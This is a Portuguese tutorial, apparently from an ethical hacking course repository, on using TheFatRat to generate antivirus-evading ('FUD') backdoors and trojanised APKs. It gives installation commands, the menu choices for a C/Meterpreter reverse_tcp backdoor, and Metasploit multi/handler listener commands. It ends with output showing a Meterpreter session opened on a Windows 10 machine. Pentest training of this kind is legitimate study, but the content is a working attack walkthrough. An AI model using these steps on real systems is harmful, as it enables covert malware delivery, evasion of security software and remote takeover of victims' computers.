# [The Fat Rat](https://github.com/screetsec/TheFatRat)

O **TheFatRat** é uma ferramenta de **post-exploitation** usada em **pentesting** e **Red Team** para gerar *backdoors* e *payloads* customizados que conseguem **bypassar antivírus e soluções de segurança**.

Ele é parecido em propósito com o **Veil**, mas tem um enfoque mais “all-in-one” para gerar executáveis maliciosos a partir de payloads do **Metasploit** ou de código próprio.

**O que faz**
* **Gera backdoors em diferentes linguagens** (C, C++, Python, Java, etc.).
* **Converte payloads do Metasploit** em binários ofuscados para Windows, Linux ou Android.
* **Bypass AV/EDR**: aplica técnicas de ofuscação para reduzir detecção.
* **Integração com msfvenom**: automatiza a criação de *reverse shells* e *meterpreters*.
* **Compila e empacota executáveis** usando ferramentas como MinGW, GCC e Wine.
* **Criação de APKs maliciosos** para Android (injetando payloads em apps legítimos).
* **Gerador de trojans FUD (Fully Undetectable)**, segundo os desenvolvedores, para fins de teste.

## Comparação com o Veil

| Recurso                       | **Veil** 🟢                              | **TheFatRat** 🔴                             |
| ----------------------------- | ---------------------------------------- | -------------------------------------------- |
| **Payloads Windows**          | ✅ (PyInstaller, AutoIt)                  | ✅ (C, C++, msfvenom)                         |
| **Payloads Linux**            | ❌                                        | ✅ (ELF com GCC)                              |
| **Payloads Android (APK)**    | ❌                                        | ✅ (injeta payload em apps legítimos)         |
| **Integração com Metasploit** | ✅ (gera payloads compatíveis)            | ✅ (usa msfvenom por baixo dos panos)         |
| **Bypass AV/EDR**             | ✅ (muito bom em evasão, foco do projeto) | ✅ (mas mais fácil de ser detectado em 2025)  |
| **Ofuscação avançada**        | ✅ (criptografia, empacotamento)          | Parcial (foco mais na variedade de payloads) |
| **Automação (menús/scripts)** | Médio (menu simples)                     | Alto (framework “all-in-one”)                |
| **Customização de código**    | ✅ (suporte a scripts customizados)       | ✅ (pode editar payloads gerados)             |
| **Manutenção do projeto**     | ✅ (ativo, usado em Red Teams)            | ⚠️ menos ativo, detectado por AV modernos    |

**Quando escolher Veil:**
* Precisa de payloads Windows furtivos para testes contra EDR/antivírus.
* Quer trabalhar com Red Team moderno, com foco em evasão.
* Cenários de pesquisa em evasão de AV.

**Quando escolher TheFatRat:**
* Precisa gerar payloads variados (Windows, Linux, Android) de forma rápida.
* Quer testar múltiplas plataformas em laboratório.
* Está começando em pentest e quer uma ferramenta “all-in-one” para entender o processo.

## Instalação

Rodar os somandos abaixo com privilégio root.
```
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh && ./setup.sh
```
## Criação do payload

No diterório criado pelo git, exexute o comando abaixo com privilégio root:

`./fatrat`

![Tela Fat Rat](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/9834c9bac3637661c199b2ad9406d30fda510b44/5%20-%20Virus%20-%20Trojans%20-%20etc/rat_01.png)

Nesse exemplo, escolhemos a opção 6: create FUD backdoor 1000% with PwnWinds

O tipo de injection:

![Tela Fat Rat](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/336a94b50b09e7ccc1ed8568c609a37c4860db94/5%20-%20Virus%20-%20Trojans%20-%20etc/rat_02.png)

Escolhida a opção 6: Create backdoor with C / Meterpreter_reverse_tcp (FUD 97%)

Por fim, informações os dadoa solicitados:

![Tela fat Rat](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/336a94b50b09e7ccc1ed8568c609a37c4860db94/5%20-%20Virus%20-%20Trojans%20-%20etc/rat_03.png)

O The Fat Rat gererá o arquivo com o payload do diterório indicado:

![Tela Fat Rat](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/336a94b50b09e7ccc1ed8568c609a37c4860db94/5%20-%20Virus%20-%20Trojans%20-%20etc/rat_04.png)

## Escuta da rede

Após a entrega do payload e antes de sua execução, temos que escutar a rede. Fazemos isso através do msfconsole.
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```
msf6 exploit(multi/handler) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
```
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
## Resultado
```
sf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] Sending stage (203846 bytes) to 192.168.1.38
[*] Meterpreter session 6 opened (192.168.1.10:4444 -> 192.168.1.38:50174) at 2025-09-02 21:53:28 -0300

meterpreter > getuid
Server username: WIN10\user
meterpreter > 
```







